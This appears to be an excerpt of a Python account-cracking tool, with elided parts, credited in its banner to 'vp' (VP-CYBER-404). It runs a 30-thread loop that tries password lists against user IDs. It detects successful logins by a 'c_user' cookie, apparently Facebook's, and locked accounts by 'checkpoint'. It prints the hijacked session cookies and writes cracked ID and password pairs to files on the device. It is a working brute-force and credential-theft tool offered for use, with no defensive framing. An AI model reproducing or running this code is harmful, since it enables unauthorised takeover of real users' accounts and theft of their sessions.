...
/____/_/  |_/___/_/ |_\____/ /_/        
  ...
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                     
  Tools Create By  vp
  My Github Account VP-CYBER-404                                                                               
  My Id Name saikotislam22
  Tools Status Random
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
""")
...
def fuck():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            asha.submit(vp,uid,pwx,tl)
    print('-------------------')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as vp-OK.txt')
    print(' [✓] CP Id Save as vp-CP.txt')
    print('-------------------')
def vp(uid,pwx,tl):
    global loop
    global cps
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[vp]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"[vp-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/vp-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[vp-CP] {cid}|{ps}")
                open('/sdcard/vp-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
